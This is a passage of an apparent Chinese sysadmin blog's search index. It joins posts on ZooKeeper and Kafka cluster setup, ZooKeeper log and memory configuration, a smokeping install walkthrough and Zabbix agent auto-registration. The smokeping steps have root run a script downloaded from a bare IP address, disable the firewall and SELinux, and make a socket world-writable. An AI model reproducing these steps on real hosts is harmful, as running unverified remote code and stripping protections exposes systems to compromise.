config: /srv/zookeeper-3.3.6/bin/../conf/zoo.cfgStarting zookeeper ... STARTED 可是查询进程不存在，可是看pid是有的，然后关闭服务就说没有这个进程。 123JMX enabled by defaultUsing config: /srv/zookeeper-3.3.6/bin/../conf/zoo.cfgStopping zookeeper ... ./zkServer.sh: line 133: kill: (31415) - 没有那个进程 走kafka查看是否所有节点都启动：12345678910111213141516[root@kafka_03 bin]# sh zkCli.shConnecting to localhost:21812017-01-04 19:20:24,849 [myid:] - INFO [main:Environment@100] - Client environment:zookeeper.version=3.4.6-1569965, built on 02/20/2014 09:09 GMT2017-01-04 19:20:24,853 [myid:] - INFO [main:Environment@100] - Client environment:host.name=kafka_032017-01-04 19:20:24,853 [myid:] - INFO [main:Environment@100] - Client environment:java.version=1.8.0_662017-01-04 19:20:24,856 [myid:] - INFO [main:Environment@100] - Client environment:java.vendor=Oracle Corporation2017-01-04 19:20:24,856 [myid:] - INFO [main:Environment@100] - Client environment:java.home=/srv/jdk1.8.0_66/jre2017-01-04 19:20:24,856 [myid:] - INFO [main:Environment@100] - Client environment:java.class.path=/srv/zookeeper-3.4.6/bin/../build/classes:/srv/zookeeper-3.4.6/bin/../build/lib/*.jar:/srv/zookeeper-3.4.6/bin/../lib/slf4j-log4j12-1.6.1.jar:/srv/zookeeper-3.4.6/bin/../lib/slf4j-api-1.6.1.jar:/srv/zookeeper-3.4.6/bin/../lib/netty-3.7.0.Final.jar:/srv/zookeeper-3.4.6/bin/../lib/log4j-1.2.16.jar:/srv/zookeeper-3.4.6/bin/../lib/jline-0.9.94.jar:/srv/zookeeper-3.4.6/bin/../zookeeper-3.4.6.jar:/srv/zookeeper-3.4.6/bin/../src/java/lib/*.jar:/srv/zookeeper-3.4.6/bin/../conf:2017-01-04 19:20:24,856 [myid:] - INFO [main:Environment@100] - Client environment:java.library.path=/usr/java/packages/lib/amd64:/usr/lib64:/lib64:/lib:/usr/lib[zk: localhost:2181(CONNECTED) 0] ls /[controller_epoch, brokers, zookeeper, kafka, dubbo, admin, isr_change_notification, consumers, config, sthp][zk: localhost:2181(CONNECTED) 5] ls /kafka/brokers/ids[0, 1, 2]显示0 1 2 三台集群机器。 kafka 三台集群这里可以看到获取到ids。 Step10: 相关文档《HBase-0.98.0分布式安装指南》 《Hive 0.12.0安装指南》 《ZooKeeper-3.4.6分布式安装指南》 《Hadoop 2.3.0源码反向工程》 《在Linux上编译Hadoop-2.4.0》 《Accumulo-1.5.1安装指南》 《Drill 1.0.0安装指南》 《Shark 0.9.1安装指南》 更多，敬请关注技术博客：http://blog.yancy.cc Step11: 结束语至此，ZooKeeper分布式安装大告成功！更多细节，请浏览官方文档 交流学习：🐧 Linux shell_高级运维派: 459096184 圈子 (系统运维-应用运维-自动化运维-虚拟化技术研究欢迎加入)🐧 BigData-Exchange School : 521621407 圈子（大数据运维)（Hadoop开发人员)（大数据研究爱好者) 欢迎加入 相应Bidata有内部微信交流群互相学习，加入QQ群有链接。","link":"/2017/05/26/Bigdata-hadoop/zookeeper/Bigdata-ZooKeeper集群快速搭建配置与扩容/"},{"title":"Bigdata-Zookeeper集群日志配置详解和清理自定义启动内存","text":"Zookeeper集群日志配置详解和清理自定义启动内存问题：搭建zookeeper和kafka集群运行大数据处理数据消费，公司dubbo使用zookeeper做服务端的服务发现管理及配置中心，在使用时都出现过由于zk的日志大小过大塞满磁盘的情况 ，遇到了Zookeeper日志问题输出路径的问题, 发现zookeeper设置log4j.properties不能解决日志路径问题, 发现解决方案如下。 zookeeper日志说明ZooKeeper使用SLF4J(the Simple Logging Facade for Java)作为日志的抽象层，默认使用Log4J来做实际的日志工作。使用2层日志抽象看起来真是够呛，这里简要的说明如何来配置Log4J。尽管Log4J非常灵活且强大，但它也有一些复杂，可以用一整本书来描述它，这里只是简要的介绍一下基本的用法。 Log4J的配置文件名为log4j.properties，从classpath中查找。如果没有找到log4j.properties文件，会输出如下警告信息： 12log4j:WARN No appenders could be found for logger (org.apache.zookeeper.serv ... log4j:WARN Please initialize the log4j system properly. 它说的是所有后续的日志消息会被丢弃，通常log4j.properties文件会放在conf文件夹，并放在classpath下。来看看ZooKeeper使用的log4j.properties的主要部分： 123456789101112131415161718192021222324[jollybi@kafka2 conf]$ cat log4j.properties | grep -Pv \"^$|^#\"zookeeper.root.logger=INFO, CONSOLE #（1）zookeeper.console.threshold=INFOzookeeper.log.dir=.zookeeper.log.file=zookeeper.logzookeeper.log.threshold=DEBUGzookeeper.tracelog.dir=. zookeeper.tracelog.file=zookeeper_trace.loglog4j.rootLogger=$&#123;zookeeper.root.logger&#125; #（2）log4j.appender.CONSOLE=org.apache.log4j.ConsoleAppender #（3）log4j.appender.CONSOLE.Threshold=$&#123;zookeeper.console.threshold&#125; #（4）log4j.appender.CONSOLE.layout=org.apache.log4j.PatternLayout #（5）log4j.appender.CONSOLE.layout.ConversionPattern=%d&#123;ISO8601&#125; [myid:%X&#123;myid&#125;] - %-5p [%t:%C&#123;1&#125;@%L] - %m%nlog4j.appender.ROLLINGFILE=org.apache.log4j.RollingFileAppender #（6）log4j.appender.ROLLINGFILE.Threshold=$&#123;zookeeper.log.threshold&#125; #（7）log4j.appender.ROLLINGFILE.File=$&#123;zookeeper.log.dir&#125;/$&#123;zookeeper.log.file&#125;log4j.appender.ROLLINGFILE.MaxFileSize=10MBlog4j.appender.ROLLINGFILE.layout=org.apache.log4j.PatternLayoutlog4j.appender.ROLLINGFILE.layout.ConversionPattern=%d&#123;ISO8601&#125; [myid:%X&#123;myid&#125;] - %-5p [%t:%C&#123;1&#125;@%L] - %m%nlog4j.appender.TRACEFILE=org.apache.log4j.FileAppenderlog4j.appender.TRACEFILE.Threshold=TRACElog4j.appender.TRACEFILE.File=$&#123;zookeeper.tracelog.dir&#125;/$&#123;zookeeper.tracelog.file&#125;log4j.appender.TRACEFILE.layout=org.apache.log4j.PatternLayoutlog4j.appender.TRACEFILE.layout.ConversionPattern=%d&#123;ISO8601&#125; [myid:%X&#123;myid&#125;] - %-5p [%t:%C&#123;1&#125;@%L][%x] - %m%n (1) zookeeper.root.logger=INFO, CONSOLE第一组设置以zookeeper开头，它们实际上是Java system property，可以被-D形式的命令行参数覆盖。第一行配置了日志级别，默认的设置是说在INFO级别以下的日志会被丢弃，并且日志会使用CONSOLE appender输出。你可以指定多个appender，例如如果你想使用CONSOLE appender和ROLLINGFILE appender输出日志，那么可以配置zookeeper.logger为INFO,CONSOLE,ROLLINGFILE。 (2) rootLogger处理所有日志的logger，因为我们没有定义其他logger。 (3) log4j.appender.CONSOLE=org.apache.log4j.ConsoleAppender这一行把CONSOLE appender和实际上处理日志输出的类绑定在一起，这里是ConsoleAppender类。 (4) appender也可以过滤日志。这一行将过滤任何在INFO级别之下的日志，因为这是在zookeeper.root.logger设置的threshold。 (5) appender使用一个布局(layout)类在输出前对日志进行格式化。我们使用pattern layout来记录日志的级别，日期，线程信息和调用位置信息以及消息本身。 (6) RollingFileAppender实现了rolling日志文件的功能，而不是持续的写到一个单独的文件或者控制台。如果rootLogger没有关联ROLLINGFILE，则此appender会被忽略。 (7) ROLLINGFILE的threshold设置成DEBUG。因为rootLogger过滤了所有在INFO级别之下的日志，没有DEBUG日志会输出到ROLLINGFILE。如果你想要看到DEBUG日志，你必须把zookeeper.root.logger从INFO改成DEBUG。 打日志会影响到进程的性能，尤其是在DEBUG级别下。同时日志会提供有价值的信息为诊断错误提供线索。一个平衡性能开销的有效方式是把appender的threshold设成DEBUG，并把rootLogger设成WARN级别，这在一般的情况都适用，一般只需要关注WARNING和它之上的日志。当你需要诊断问题时可以使用JMX动态设置为INFO或DEBUG级别，这样可以更方便定位问题。 快照事物日志,修改日志输出目录之前出现zookeeper在bin目录下出现了zookeeper.out的日志文件，经分析发现此文件是由于nohup命令打印的控制台日志。 但是，我们在zoo.cfg配置文件中，对日志文件进行了配置（截取部分） 12dataDir=/data/tools/zookeeper-3.4.5/tmpdataLogDir=/data/tools/zookeeper-3.4.5/tmp/logs 其中，dataDir和dataLogDir是针对数据信息及数据信息日志的位置配置。但是在zookeeper内部集成了log4j.properties（对应配置文件在conf路径下）。 参考log4j配置说明打开log4j.properties文件，我们会发现有这样的配置，它在说明关于zookeeper本身的一些默认设置，但是可以被系统配置文件所覆盖。那么，在log4j中，root是log4j记录的原始起点，而这部分参数又可以被系统修改，那么系统配置在什么地方呢？ 12345678# Define some default values that can be overridden by system propertieszookeeper.root.logger=INFO, CONSOLEzookeeper.console.threshold=INFOzookeeper.log.dir=.zookeeper.log.file=zookeeper.logzookeeper.log.threshold=DEBUGzookeeper.tracelog.dir=.zookeeper.tracelog.file=zookeeper_trace.log zk日志.out及log4j日志路径配置 ：首先修改bin/zkEnv.sh，配置ZOO_LOG_DIR的环境变量，ZOO_LOG_DIR是zookeeper日志输出目录，ZOO_LOG4J_PROP是log4j日志输出的配置： 默认配置： 123456789if [ \"x$&#123;ZOO_LOG_DIR&#125;\" = \"x\" ]then ZOO_LOG_DIR=\".\"fiif [ \"x$&#123;ZOO_LOG4J_PROP&#125;\" = \"x\" ]then ZOO_LOG4J_PROP=\"INFO,CONSOLE\"fi 生产环境修改： 在zk目录下面创建logs目录 给予bi组操作权限。 12sudo mkdir /data/tools/zookeeper-3.4.5/logs/sudo chown -R jollybi:jollybi /data/tools/zookeeper-3.4.5/logs/ 123456789if [ \"x$&#123;ZOO_LOG_DIR&#125;\" = \"x\" ]then ZOO_LOG_DIR=\"$ZOOBINDIR/../logs\"fiif [ \"x$&#123;ZOO_LOG4J_PROP&#125;\" = \"x\" ]then ZOO_LOG4J_PROP=\"INFO,ROLLINGFILE\" //ROLLINGFILE —— 日志轮转，避免单一文件过大fi Zk设置定期自动清理日志.从3.4.0开始，zookeeper提供了自动清理snapshot和事务日志的功能，通过配置 autopurge.snapRetainCount 和 autopurge.purgeInterval 这两个参数能够实现定时清理了。这两个参数都是在zoo.cfg中配置的： 在zoo.cfg中配置： 12345autopurge.purgeInterval: 24*2 ##这个参数指定了清理频率，单位是小时。默认是0，表示不开启自己清理功能。autopurge.snapRetainCount: 2##这个参数和上面的参数搭配使用，这个参数指定了需要保留的文件数目。默认是保留3个。 配置zookeeper.out的位置及log4j日志输出1. zookeeper.out由nohup的输出，也就是zookeeper的stdout和stdeer输出。在zkServer.sh中： 123456789if [ ! -w \"$ZOO_LOG_DIR\" ] ; then mkdir -p \"$ZOO_LOG_DIR\" fi _ZOO_DAEMON_OUT=\"$ZOO_LOG_DIR/zookeeper.out\" #日志输出文件路径#nohup日志输出nohup $JAVA \"-Dzookeeper.log.dir=$&#123;ZOO_LOG_DIR&#125;\" \"-Dzookeeper.root.logger=$&#123;ZOO_LOG4J_PROP&#125;\" \\ -cp \"$CLASSPATH\" $JVMFLAGS $ZOOMAIN \"$ZOOCFG\" &gt; \"$_ZOO_DAEMON_OUT\" 2&gt;&amp;1 &lt; /dev/null &amp; 2.log4j日志输出配置 conf/log4j.properties中：123456# Add ROLLINGFILE to rootLogger to get log file output # Log DEBUG level and above messages to a log file log4j.appender.ROLLINGFILE=org.apache.log4j.RollingFileAppender //日志轮转，DaliyRollingFileAppender —— 按天轮转log4j.appender.ROLLINGFILE.Threshold=$&#123;zookeeper.log.threshold&#125; log4j.appender.ROLLINGFILE.File=$&#123;zookeeper.log.dir&#125;/$&#123;zookeeper.log.file&#125; 轮转前提需要将(1)里bin/zkEnv.sh中的轮转配置好 4.zk事务日志查看 zookeeper的事务日志通过zoo.cfg文件中的dataLogDir配置项配置： # the directory where the snapshot is stored. # do not use /tmp for storage, /tmp here is just # example sakes. dataDir=/tmp/zookeeper 查看事务日志方法：(需要下载slf4j-api-1.6.1.jar包) 1java -classpath .:slf4j-api-1.6.1.jar:zookeeper-3.4.5.jar org.apache.zookeeper.server.LogFormatter /tmp/zookeeper/version-2/xxx.xxx 怎么自定义zookeeper的启动内存运行zookeeper时，使用jmap -heap 命令查看内存情况如下: 解决：分配内存文件路径：zookeeper/bin/zkEnv.sh 该文件已经明确说明有独立JVM内存的设置文件，路径是zookeeper/conf/java.env安装的时候这个路径下没有有java.env文件，需要自己新建一个： 12345678# vim java.env#!/bin/shexport JAVA_HOME=/usr/java/jdk# heap size MUST be modified according to cluster environmentexport JVMFLAGS=\"-Xms4g -Xmx4g $JVMFLAGS\"对于内存的分配，还是根据项目和机器情况而定。如果内存够用，适当的大点可以提升zk性能。","link":"/2017/08/27/Bigdata-hadoop/zookeeper/Bigdata-Zookeeper集群日志配置详解和清理自定义启动内存 /"},{"title":"Zookeeper 报错：Unable to connect to zookeeper server within timeout:6000","text":"Zookeeper 报错：Unable to connect to zookeeper server within timeout : 6000问题：Exception in thread “main” org.I0Itec.zkclient.exception.ZkTimeoutException: Unable to connect to zookeeper server within timeout: 6000 解决：I had the same problem and here is how I fixed it:1) Stop all Kafka and Zookeeper processes 12ps -aux | grep zoops -aux | grep kafka (then proceed to kill all process ids from above jobs)2) Run zookeeper 1&lt;kafka_dir&gt;/bin/zookeeper-server-start.sh ../config/zookeeper.properties 3) Run kafka server 1&lt;kafka_dir&gt;/bin/kafka-server-start.sh ../config/server.properties ✨✨查看zk配置然后重启服务。 123./zookeeper-3.4.6/bin/zkServer.sh start./zookeeper-3.4.6/bin/zkServer.sh status./bin/kafka-server-start.sh config/server.properties &amp; 先重启zk后重启kafka 因为kafka基于zk运行的,Zk运行超时。说明连接有问题。查看启动日志。","link":"/2017/05/04/Bigdata-hadoop/zookeeper/Zookeeper 报错：Unable to connect to zookeeper server within timeout: 6000/"},{"title":"用最简单的方式安装smokeping","text":"smokeping这个监控还是很强大的，用这个监控是在第一家公司做IDC起家后面转型CDN云计算云加速。这个也是我学的最早的一款监控，在这里我用编译安装方式。也有脚本安装不过需要了解过somkeping安装过程会比较看的懂脚本。 适用于宽带运营商维护和IDC机房维护可以检测本地网络的到上级运营商出口这段路由各个节点的稳定性 可以检测本地网络到各主要门户网站的延时，丢包率，稳定性可以检测本地网络到各地游戏服务器的延时，丢包率，稳定性 smokeping缺点：不能在前台Web页面添加要检测的节点，必须在后台smokeping的配置文件中添加 安装前的准备： 操作系统：选择centOS6.5最小化版， 里面的RPM包基本上都是最新的。 注1: centOS 5.6版本在安装rpmforge-release-0.5.3-1.el6.rf.x86_64.rpm包是会遇到依赖性问题，要求安装rpmlib包，但centOS5.6版本中的rpmlib版本较低，无法直接安装 注2：在安装centOS6.5时，要注意设置系统的IP地址，如下图,点击【configure network】按钮，选择【system eth0】, 点击 【IPv4Seting】,设置IP地址 注3: 选择安装包时，点选【Basic Server】, 要安装621个基本包 注4: 其他安装步骤，按照正常的安装流程操作即可 二. 安装过程修改时区 1\\cp /usr/share/zoneinfo/Asia/Shanghai /etc/localtime 同步时间 1ntpdate time.nist.gov 写入BIOS 1hwclock -w 关闭防火墙 1service iptables stop 1. 安装第三方软件源123464位系统 rpm -Uvh http://apt.sw.be/redhat/el6/en/x86_64/rpmforge/RPMS/rpmforge-release-0.5.3-1.el6.rf.x86_64.rpm32位系统rpm -Uvh http://apt.sw.be/redhat/el6/en/i386/rpmforge/RPMS/rpmforge-release-0.5.3-1.el6.rf.i686.rpm 注：安装这个源后，接下来要安装的大量的依赖包就不会报错 123rpm -Uvh http://dl.fedoraproject.org/pub/epel/6/x86_64/epel-release-6-8.noarch.rpm sed -i 's/^#baseurl/baseurl/g' /etc/yum.repos.d/epel.reposed -i 's/mirrorlist/#mirrorlist/g' /etc/yum.repos.d/epel.repo 2. 安装rrdtool与依赖库1yum -y install perl perl-Net-Telnet perl-Net-DNS perl-LDAP perl-libwww-perl perl-RadiusPerl perl-IO-Socket-SSL perl-Socket6 perl-CGI-SpeedyCGI perl-FCGI perl-CGI-SpeedCGI perl-Time-HiRes perl-ExtUtils-MakeMaker perl-RRD-Simple rrdtool rrdtool-perl curl fping echoping httpd httpd-devel gcc make wget libxml2-devel libpng-devel glib pango pango-devel freetype freetype-devel fontconfig cairo cairo-devel libart_lgpl libart_lgpl-devel mod_fastcgi screen wqy-zenhei-fonts.noarch wqy-zenhei-fonts-common.noarch lrzsz nginx 注：perl-CGI-SpeedyCGI，perl-CGI-SpeedCGI这两个包在安装过程中会提示找不到，但没关系注：用yum安装大量的依赖包还是很方便的，而百度上有些关于安装smokeping的文档要求使用wget下载后再用make,make install方式安装，虽然make方式不复杂，但通过make编译再安装几十个包就显得有点繁锁了。 3.下载与安装smokeping12345wget http://oss.oetiker.ch/smokeping/pub/smokeping-2.6.8.tar.gzwget http://oss.oetiker.ch/smokeping/pub/smokeping-2.6.11.tar.gz tar zxvf smokeping-2.6.8.tar.gzcd smokeping-2.6.8./configure --prefix=/usr/local/smokeping 出现问题是因为需要安装perl的模块，所以运行下面内容即可 1234567如果只出现 Config::Grammar' ... Failed解决 'Config::Grammar' ... Failedwget http://search.cpan.org/CPAN/authors/id/D/DS/DSCHWEI/Config-Grammar-1.10.tar.gztar zxvf Config-Grammar-1.10.tar.gzcd Config-Grammar-1.10perl Makefile.PLmake &amp;&amp; make install 如果出现很多个failed，就用下面的方法 1234567./setup/build-perl-modules.sh /usr/local/smokeping/thirdparty 这个是为前面failed做安装 ./co nfigure --prefix=/usr/local/smokeping 如果还出现问题可以看下这里面的参考。http://bbs.51cto.com/thread-1106181-1.html/usr/bin/gmake install安装下yum install cpan perl -MCPAN -e 'install CGI' perl -MCPAN -e 'install CGI::Fast ' 这个安装好了然后再执行这一步。 如果上面提示CGI 没有安装成功。 1234567wgethttp://www.cpan.org/authors/id/M/MA/MARKSTOS/CGI.pm-3.65.tar.gztar zxvf CGI.pm-3.65.tar.gzcd CGI.pm-3.65perl Makefile.PLmake &amp;&amp; make install然后再执行下 ./configure --prefix=/usr/local/smokeping 现在smokeping安装完成 4. 配置smokeping第一种 使用nginx12341.安装nginxrpm -Uvh http://dl.fedoraproject.org/pub/epel/6/x86_64/epel-release-6-8.noarch.rpmyum install -y nginxhttps://metacpan.org/pod/release/MSTROUT/ExtUtils-MakeMaker-6.59/lib/ExtUtils/MakeMaker.pm 下载Make 让他直接执行 2.安装基础IO 123456cd /rootwget http://220.194.199.196/download/IO-All-0.46.tar.gztar xvzf IO-All-0.46.tar.gzcd IO-All-0.46perl Makefile.PL # 这里出现这个问题 把那个文件删了就行了。make &amp;&amp; make install 3.配置nginx的sock创建fcgi sock 文件，配置nginx fcgi使用 12345#wget http://autonagios.googlecode.com/svn/trunk/autonagios-20100103/files/nginx-fcgi.txt -O /etc/nginx-fcgiwget http://117.27.153.133/nginx-fcgi.txt -O /etc/nginx-fcgi chmod a+x /etc/nginx-fcgi/etc/nginx-fcgi -l /var/log/nginx-fcgi.log -pid /var/run/nginx-fcgi.pid -S /var/run/nginx-fcgi.sockchmod 777 /var/run/nginx-fcgi.sock 4.增加smokeping使用的data、var、和cache目录 123456cd /usr/local/smokepingmkdir data var cachemv htdocs/smokeping.fcgi.dist htdocs/smokeping.fcgicd /usr/local/smokeping/etcmv config.dist configchmod 600 /usr/local/smokeping/etc/smokeping_secrets.dist 5.上传监控节点conf文件到smokeping的etc目录6.修改smokpeing配置脚本 123456789101112131415vi config在如下位置修改*** Database ***step = 300pings = 20修改为*** Database ***step = 60pings = 20在如下位置添加一句话*** Presentation ***template = /usr/local/smokeping/etc/basepage.html.distcharset=utf-8 在第一个加号位置下将监控节点文件引入，如下例子 1234567+ testnetworkmenu=测试网络状况title= 测试网络状况@include CT-IP.conf@include CN-IP.conf@include CT_IDC.conf@include CNC-IDC.conf 保存退出 7.增加data、var、cache目录的软连接 123ln -s /usr/local/smokeping/data/ /usr/share/nginx/html/dataln -s /usr/local/smokeping/cache/ /usr/share/nginx/html/cacheln -s /usr/local/smokeping/htdocs/cropper/ /usr/share/nginx/html/cropper 8.修改nginx 配置文件查看下nginx的版本，使用nginx -v 查看，如下例子： 12 nginx -vnginx version: nginx/1.0.15 修改nginx配置 1234567891011vi /etc/nginx/conf.d/default.conf--增加fcgi 指向 location ~ .*\\.fcgi$ &#123; root /usr/local/smokeping/htdocs/; gzip off; fastcgi_pass unix:/var/run/nginx-fcgi.sock; fastcgi_index smokeping.fcgi; include fastcgi.conf; #1.0.x 与0.8.x 用这个 #include fastcgi_params; #1.4.x版本用 fastcgi_params #fastcgi_param SCRIPT_FILENAME /opt/smokeping/htdocs$fastcgi_script_name; #1.4.x版本必加 &#125; 保存退出 第二种 使用apache(1) 创建cache、data、var目录 12cd /usr/local/smokepingmkdir htdocs/cache data var (2) 在创建日志 1touch /var/log/smokeping.log (3) 上传监控节点的conf文件到smokeping的etc目录下修改smokeping目录的用户和组权限 12chown apache:apache -R /usr/local/smokepingchown apache:apache /var/log/smokeping.log (4) 修改配置文件 12345678910111213141516171819202122232425262728cd /usr/local/smokeping/htdocs/mv smokeping.fcgi.dist smokeping.fcgicd /usr/local/smokeping/etcmv config.dist configvi config修改改行设置imgcache = /usr/local/smokeping/cacheimgcache = /usr/local/smokeping/htdocs/cache *** Database ***step = 300pings = 60然后修改step，从300改为60，这是检测的时间, pings 从20 改为60, 即60秒ping 60次在如下位置添加一句话*** Presentation ***template = /usr/local/smokeping/etc/basepage.html.distcharset=utf-8在第一个加号位置下将监控节点文件引入，如下例子+ testnetworkmenu=测试网络状况title= 测试网络状况@include CT-IP.conf@include CN-IP.conf@include CT_IDC.conf@include CNC-IDC.conf 保存退出 (5) 配置完成之后修改密码文件权限 1chmod 600 /usr/local/smokeping/etc/smokeping_secrets.dist 修改apache的配置 12345678910111213141516vim /etc/httpd/conf/httpd.conf在DocumentRoot \"/var/www/html\" 这一行之下添加如下内容：Alias /cache \"/usr/local/smokeping/htdocs/cache\"Alias /cropper \"/usr/local/smokeping/htdocs/cropper\"Alias /smokeping \"/usr/local/smokeping/htdocs\"&lt;Directory \"/usr/local/smokeping/htdocs\"&gt; AllowOverride None AddHandler cgi-script .fcgi .cgi Options ExecCGI &lt;IfModule dir_module&gt; DirectoryIndex smokeping.fcgi &lt;/IfModule&gt; Order allow,deny Allow from all &lt;/Directory&gt; 设置开机启动httpd, smokeping,并关闭iptables. 1234echo \"/usr/local/smokeping/bin/smokeping --logfile=/var/log/smokeping.log 2&gt;&amp;1 &amp;\" &gt;&gt; /etc/rc.localchkconfig httpd on #开机启动httpd进程chkconfig iptables off #开机不启动iptables服务chkconfig nginx on 启动http或者nginx以及smokeping 123service httpd start service nginx start/usr/local/smokeping/bin/smokeping --debug-daemonchown apache:apache -R /usr/local/smokeping 打开检测主机的Web页面. 使用httpd做web，在Web浏览器里输入http://您的监控主机IP/smokeping 这里启动不了，看下什么原因。是不是CT-IDC.conf 没有上传到etc下面 打开这里出现500 说明配置正确防火墙看下。serenfroce 0 有没有关闭。 使用nginx做web，在Web浏览器里输入 http://您的监控主机IP/smokeping.fcgi 这里启动不了，看下什么原因。是不是CT-IDC.conf 没有上传到etc下面 如果遇到500错误： 123456789101112Internal Server ErrorThe server encountered an internal error or misconfiguration and was unable to complete your request.Please contact the server administrator, root@localhost and inform them of the time the error occurred, and anything you might have done that may have caused the error.More information about this error may be available in the server error log.--------------------------------------------------------------------------------Apache/2.2.15 (CentOS) Server at 192.168.2.101 Port 80说明没有关闭SElinux 选项，关闭就正常了vi /etc/sysconfig/selinuxSELINUX=permissive[root@localhost ~]# getenforce #查看SElinux 的命令Permissive #返回的结果是Permissive, 表示已经关闭SElinux了 在Web页面增加验证用户名和密码(可选步骤) 1234567891011121314(1)修改httpd.conf里的内容&lt;Directory \"/usr/local/smokeping\"&gt;AllowOverride NoneOptions AllAddHandler cgi-script .fcgi .cgiAllowOverride AuthConfigOrder allow,denyAllow from allAuthName \"Smokeping\"AuthType BasicAuthUserFile /usr/local/smokeping/htdocs/htpasswdRequire valid-userDirectoryIndex smokeping.fcgi&lt;/Directory&gt; 注：上面的内容部分已经添加，这里仅添加红色字体内容即可。 (2) 设置登录账户与密码进入cd /usr/local/smokeping/htdocs目录， 执行命令：htpasswd -c /usr/local/smokeping/htdocs/htpasswd admin这个是设置登录账户为admin，密码在后面输入，然后重启httpd就可以实现密码验证登录重新登录web页面，会要求输入用户名和密码. 一定要同步好时间 在ESXI4的虚拟机中，定期执行ntpdate 210.72.145.44 #或者与本地的时间服务器同步在vmware workstation中，安装vmware-tools， 虚拟机的时间会自动与其宿主机时间同步 注： 如果vmware workstation中的虚拟机不安装vmware-tools，则虚拟机时间会与宿主机时间相隔整整8个小时(虚拟机时间早于宿主机时间) vmware-tools的安装不在此叙述 特别说明: 修改/usr/local/smokeping/etc/config 文件的配置参数，必须重启动smokeping程序 12345(1)如果重启动smokeping程序失败，根据报错提示删除/usr/local/smokeping/data子文件夹的rrd文件(2)中文问题：如果需要在网页里展示中文，修改/usr/local/smokeping/etc的config文件*** Presentation ***charset = utf-8 //注：在这里添加然后在menu与titile里修改中文，重启即可 有一个要注意的地方就是，你输入的中文必须在utf-8的字符编码下输入的中文字符，不然会出现乱码。 如果在xshel下，选择file-properities-terminal如果还是不显示就看看你系统里是否安装了中文字体，或者在安装一个 123456789[root@smokeping data]# ps -ef |grep smoke #查找smokeping进程root 8740 1 0 09:08 ? 00:00:00 /usr/local/smokeping/bin/smokeping [FPing]root 35552 35529 0 09:33 pts/2 00:00:00 grep smoke[root@smokeping data]# kill 8740 #杀掉smokeping进程[root@smokeping data]# ps -ef |grep smokeroot 35554 35529 4 09:33 pts/2 00:00:00 grep smokesmokeping进程已经被杀掉[root@smokeping data]#screen #如果通过SSH远程登录到监控主机，最后执行screen，在虚拟窗口中启动smokeping/usr/local/smokeping/bin/smokeping --logfile=/var/log/smokeping.log 2&gt;&amp;1 &amp; 三. 添加需要监控的网站和节点(在/usr/local/smokeping/etc/config中添加) smokeping就这点不好，添加节点不能在前台Web页面添加，一定要在后台的配置文件中添加,希望以后的版本中能改进一下 * 修改/usr/local/smokeping/etc/config 后，必须重启smokeping 程序，配置才会生效 * smokeping 会根据配置文件config 在/usr/local/smokeping/data 之下添加moniter文件夹，其下包含website子文件夹 * 用vmware workstation的虚拟机测试有一点好处，workstation下的虚拟网卡可以设置出入的丢包率，适合smokeping做丢包测试, 经过测试smokeping检测出的丢包率与vmware worksation虚拟网卡设置的丢包率基本相同,也就是说smokeping 能够反应网络的真实状况 * 添加监控节点示例：注意+是第一层，++是第二层，+++ 是第三层 123456789101112131415161718192021222324252627282930313233343536+ moniter menu = moniter++ websitemenu = websitetitle = moniter website#host = /moniter/website/baidu /moniter/website/sina /moniter/website/taobao /moniter/website/QQ+++ baidumenu = baidutitle = baidu.comalerts = somelosshost = www.baidu.com+++ sinamenu = sinatitle = sina.com.cnalerts = somelosshost = www.sina.com.cn+++ taobaomenu = taobaotitle = taobao.comalerts = somelosshost = www.taobao.com+++ QQmenu = QQtitle = QQalerts = somelosshost = www.qq.com.cn+++ sohumenu = sohutitle = sohualerts = somelosshost = www.sohu.com 效果图：当前菜单下主机延时，丢包图 效果图：当前菜单下某主机延时，丢包详细图 13.图例说明 绿块表示不丢包，其他颜色的块表示不同程序的丢包。图形越平稳，表示网络越稳定，如果图形峰值和低谷很多，则表示网络时延不稳定，忽高忽低。 这里apache 如果要你做个URL的文件下载测试 1dd if=/dev/null bs=1M count=1 of=/var/www/html/index.html","link":"/2014/04/19/性能监控/Somekeping/用最简单易懂的方式安装smokeping/"},{"title":"ZABBIX 3.0 自动发现  (九)","text":"####自动化分类 所有的自动化都可以分为2种 1.自动注册 zabbix-agnet自动添加 2.主动发现 自动发现 Discover zabbix api Zabbix自动发现(Discovery)功能使用随着监控主机不断增多，有的时候需要添加一批机器，特别是刚用zabbix的运维人员需要将公司的所有服务器添加到zabbix，如果使用传统办法去单个添加设备、分组、项目、图像…..结果应该是让人吐的结果。鉴于这个问题我们可以好好利用下Zabbix的一个发现(Discovery)模块，进而来实现自动刚发现主机、自动将主机添加到主机组、自动加载模板、自动创建项目（item）、自动创建图像，下面我们来看看这个模块如何使用。 #####Hadoop集群自动发现： 一、自动注册设置 zabbix-agent配置123456789101112[root@wlj-datanode10 zabbix]# cat zabbix_agentd.confPidFile=/var/run/zabbix/zabbix_agentd.pidLogFile=/var/log/zabbix/zabbix_agentd.logLogFileSize=0Server=10.155.74.153# 主动模式下的zabbix服务端ServerActive=10.155.74.153# 主机名(这个会自动加入到zabbix-server断的主机显示中)Hostname=wlj-datanode10.jollychic.com-169.44.23.133Timeout=10UnsafeUserParameters=1HostMetadata=bi # 作为server端的判断条件入口 我们先不重启，因为重启就生效了。我们需要设置一个规则，如果已经设置好规则可以重启。 ✨✨提示： zabbix-agent起来的时候回去找Server，这时候就会产生一个事件，然后我们可以基于这个事件来完成一个动作。 Configuration - Actions - Create action 1234567name:bi-dataDefault subject : Auto registration: &#123;HOST.HOST&#125;Default message :Host name: &#123;HOST.HOST&#125;Host IP: &#123;HOST.IP&#125;Agent port: &#123;HOST.PORT&#125; 选择新的触发条件选择下拉框中的服务类型 选择发送告警对应的用户组-发送方式微信告警 选择自动发现服务器添加相应的分组 选择自动发现服务器添加相应监控模板 修改完之后我们在重启一下 1[root@wlj-datanode3 ~]# systemctl restart zabbix-agent.service 自动发现可以去扫描IP地址范围（需要手动设置）进行发现的动作 监控告警接收： 交流学习：🐧 Linux shell_高级运维派: 459096184 圈子 (系统运维-应用运维-自动化运维-虚拟化技术研究欢迎加入)🐧 BigData-Exchange School : 521621407 圈子（大数据运维)（Hadoop开发人员)（大数据研究爱好者) 欢迎加入 相应Bidata有内部微信交流群互相学习，加入QQ群有链接。","link":"/2017/05/21/性能监控/Zabbix/ZABBIX 3.0 自动发现  (九)/"},{"title":"ZABBIX monitoring Flume","text":"ZABBIX monitoring FlumeFlume本身提供了http, 